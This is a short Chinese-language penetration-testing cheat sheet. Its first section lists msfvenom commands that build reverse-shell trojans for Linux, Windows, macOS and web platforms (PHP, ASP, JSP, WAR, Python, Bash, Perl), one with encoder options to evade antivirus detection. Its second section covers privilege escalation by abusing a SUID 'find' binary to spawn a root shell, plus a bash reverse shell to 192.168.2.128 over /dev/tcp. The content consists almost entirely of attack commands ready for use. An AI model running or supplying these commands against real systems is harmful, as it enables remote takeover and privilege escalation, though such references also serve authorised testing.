# msf 生成木马

注意：msfconsole连接的时候的`payload`应该为参数`-p`的值

```
Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=< Your Port to Connect On> -f elf > shell.elf

Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.17.17.128 lport=5555 -e x86/shikata_ga_nai -i 3 -b '\x00' -f exe -o shell.exe


Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.machoWeb Payloads

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp

JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
Pythonmsfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py

Bash
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh

Perl
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
```

# 提权

## find 命令提权n种姿势

推荐：`find / -name abc -exec /bin/sh -p \;`

```bash
# 姿势一
find / -perm -g=s -type f 2>/dev/null
find . -exec /bin/sh -p \; -quit

# 姿势二
touch getshell
find / -type f -name getshell -exec "whoami" \;
find / -type f -name getshell -exec "/bin/sh" \;

# 姿势三	abc 为文件名，必须存在！
find / -name abc -exec /bin/sh -p \;
find abc -exec "/bin/sh" \;

# 姿势四，反弹shell
find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.2.128/9919 0>&1 \;
```

